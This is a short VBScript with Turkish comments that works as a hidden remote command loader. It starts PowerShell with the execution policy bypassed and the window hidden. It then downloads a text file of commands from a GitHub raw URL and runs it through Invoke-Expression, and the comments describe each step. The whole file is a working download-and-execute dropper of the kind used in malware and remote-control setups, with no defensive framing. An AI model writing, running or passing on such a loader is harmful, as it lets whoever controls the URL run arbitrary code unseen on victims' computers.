Set objShell = CreateObject("WScript.Shell")
' Komutları çekeceğin adres
url = "https://raw.githubusercontent.com/NexoraAPI/project/main/komutlar.txt"

' PowerShell'e diyoruz ki: İnternetteki içeriği indir ve "Invoke-Expression" (IEX) ile çalıştır
psCommand = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""IEX (New-Object Net.WebClient).DownloadString('" & url & "')"""

' 0 = Gizli çalıştır
objShell.Run psCommand, 0, False
